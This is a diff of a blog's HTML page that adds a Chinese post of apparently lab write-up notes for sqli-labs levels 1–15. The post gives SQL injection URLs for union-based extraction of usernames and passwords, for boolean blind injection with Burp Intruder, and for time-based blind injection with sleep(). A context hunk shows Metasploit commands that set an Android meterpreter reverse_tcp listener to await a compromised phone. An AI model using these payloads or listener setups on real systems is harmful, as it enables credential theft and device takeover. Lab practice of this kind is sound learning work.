@@ -48,6 +48,54 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-12-14" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/14/12-14/">12.14</a>
+    </h1>
+  
+
+        <div class="article-meta">
+          <a href="/2023/12/14/12-14/" class="article-date">
+  <time datetime="2023-12-14T09:25:55.000Z" itemprop="datePublished">2023-12-14</time>
+</a>
+          
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="sqli靶场1-15关"><a href="#sqli靶场1-15关" class="headerlink" title="sqli靶场1-15关"></a>sqli靶场1-15关</h2><p>记录一：<br>判断出类型<br><a target="_blank" rel="noopener" href="http://192.168.2.99/Less-1/?id=1">http://192.168.2.99/Less-1/?id=1</a>‘ and ‘1’&#x3D;’1’– -<br>判断出字段的数量<br><a target="_blank" rel="noopener" href="http://192.168.2.99/Less-1/?id=1">http://192.168.2.99/Less-1/?id=1</a>‘ order by 3 – -<br>测试字段数量<br><a target="_blank" rel="noopener" href="http://192.168.2.99/Less-1/?id=1">http://192.168.2.99/Less-1/?id=1</a>‘ union select 1,2,3– -<br>查询数据库<br><a target="_blank" rel="noopener" href="http://192.168.2.99/Less-1/?id=-1">http://192.168.2.99/Less-1/?id=-1</a>‘ union select 1,2,group_concat(schema_name) from information_schema.schemata – -<br>查询出表<br><a target="_blank" rel="noopener" href="http://192.168.2.99/Less-1/?id=-1">http://192.168.2.99/Less-1/?id=-1</a>‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’ – -<br>查询出表的字段<br><a target="_blank" rel="noopener" href="http://192.168.2.99/Less-1/?id=-1">http://192.168.2.99/Less-1/?id=-1</a>‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ – -<br>查询出想要字段的内容<br><a target="_blank" rel="noopener" href="http://192.168.2.99/Less-1/?id=-1">http://192.168.2.99/Less-1/?id=-1</a>‘ union select 1,username,password from users where id&#x3D;’2’ – -</p>
+<p>记录二：<br>通过?id&#x3D;1，后面进行单引号和双引号测试，均报错，可以探出数字型<br>    <a target="_blank" rel="noopener" href="http://192.168.2.99/Less-2/?id=1">http://192.168.2.99/Less-2/?id=1</a><br>order by 测试出字段为3，下列代码进行联合查询对2，3可以修改的字段查询出用户和密码<br><a target="_blank" rel="noopener" href="http://192.168.2.99/Less-2/?id=-1">http://192.168.2.99/Less-2/?id=-1</a> union select 1,group_concat(username),group_concat(password) from users</p>
+<p>记录三：<br>通过?id&#x3D;1,后面进行单引号和双引号测试，单引号报错，说明单引号破坏了原本的语句，而加单引号和过滤后还是报错，可以判断有括号，经过测试是双括号<br><a target="_blank" rel="noopener" href="http://192.168.2.99/Less-3/?id=1">http://192.168.2.99/Less-3/?id=1</a>‘)) order by 3 –+</p>
+<p>记录四：<br>通过?id&#x3D;1,后面进行单引号和双引号测试，双引号报错，说明单引号破坏了原本的语句，而加双引号和过滤后还是报错，可以判断有括号<br><a target="_blank" rel="noopener" href="http://192.168.2.99/Less-4/?id=1">http://192.168.2.99/Less-4/?id=1</a>“) order by 3 –+</p>
+<p>记录五：<br>通过?id&#x3D;1,发现页面没有回显，请求的时候只有对错回显，经过测试是单引号的字符类型,此时可以通过布尔盲注的方式来测试出想要的结果，用burpsuite工具截取客户端请求的数据,将数据进行repeater中继器直接对页面进行响应，sql语句Substring判断截取的信息对位判断，正确回显You are in………..，正确的响应头Content-Length的长度是704。</p>
+<p>在将repeater中继器的客户端请求数据引入到Intruder中，做自动化入侵，设置需要循环的字段，(1).substring中的第二个参数(用来截取字符串的位数)，(2).需要判断的字符串。其次将攻击手段改为Cluster bomb</p>
+<p>设置payloads</p>
+<p>然后Start sttack按键进行攻击,最后查看返回的结果，正确的回显结果响应头Content-Length的长度是704</p>
+<p>记录六：<br>第六关和第五关是差不多的，根据页面报错信息可以猜测id参数是双引号，只需将第五关的单引号换成双引号就可以了。</p>
+<p>记录七：<br>第七关一样的是进行第五第六关的盲注方法，只不过闭合方式不一样，经过测试单引号报错，说明破坏了原有的sql语句，但是闭合注释后仍然报错，说明是有括号的，经过测试时单引号和双括号</p>
+<p>记录八：<br>第八关和第五关一模一样，只不过没有错误的回显信息。</p>
+<p>记录九：<br>第九关不管输入什么页面显示的东西都是一样的，这个时候就不适合盲注等方式，页面不会有任何结果，此时可以使用sleep()函数对页面进行延迟，并用if判断真假，如果为真sleep让页面延迟，通过页面的响应时间判断出id参数是单引号的字符串<br><a target="_blank" rel="noopener" href="http://192.168.2.99/Less-9/?id=1%27and">http://192.168.2.99/Less-9/?id=1&#39;and</a> if(1&#x3D;1,sleep(5),1) –+<br>接下来使用burp suite和记录五操作一样，Content-Length的长度是744，只不过sql注入的方式不一样</p>
+<p>记录十：<br>第十关和第九关一样操作，不过需要将单引号换成双引号</p>
+<p>记录十一：<br>第十一关是post请求，通过在输入框username输入1’页面的返回结果可以看出是单引号的字符串类型,用单引号闭合,通过sql语句我们可以构造一个恒成立的sql语句，看的查询出什么。这里我们使用–+注释就不行，需要换成#来注释， 这个就和我们第一关是一样了。使用联合注入就可以获取数据库信息。</p>
+<p>记录十二：<br>当我们输入1’，页面没有反应输入1”,响应结果可以看出是双引号加括号,和记录十一是一样的，把单引号换成双引号和括号</p>
+<p>记录十三：<br>第十三关和第十二关差不多，把双引号和括号换成单引号和括号<br>记录十四：<br>第十四关和第十一关差不多，把单引号换成双引号<br>记录十五：<br>第十五关和第十一关一摸一样，但是没有回显，就是盲注。</p>
+
+      
+    </div>
+  </div>
+ 
+</article>
+
+
+  
     <article id="post-12-13" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -670,39 +718,6 @@
 <p>set payload android&#x2F;meterpreter&#x2F;reverse_tcp   &#x2F;&#x2F;选择Payload</p>
 <p>show options   &#x2F;&#x2F;查看参数设置<br>set LHOST kali IP  &#x2F;&#x2F;这里的地址设置成我们刚才生成木马的IP地址<br>set LPORT 5555   &#x2F;&#x2F;这里的端口设置成刚才我们生成木马所监听的端口<br>exploit   &#x2F;&#x2F;开始执行漏洞 开始监听,等待手机上线</p>
 <p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201175132071.png" alt="image-20231201175132071"></p>
-
-      
-    </div>
-  </div>
- 
-</article>
-
-
-  
-    <article id="post-x" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/11/30/x/">斗破苍穹</a>
-    </h1>
-  
-
-        <div class="article-meta">
-          <a href="/2023/11/30/x/" class="article-date">
-  <time datetime="2023-11-30T01:44:38.000Z" itemprop="datePublished">2023-11-30</time>
-</a>
-          
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231212125606606.png" alt="image-20231212125606606"></p>
 
       
     </div>
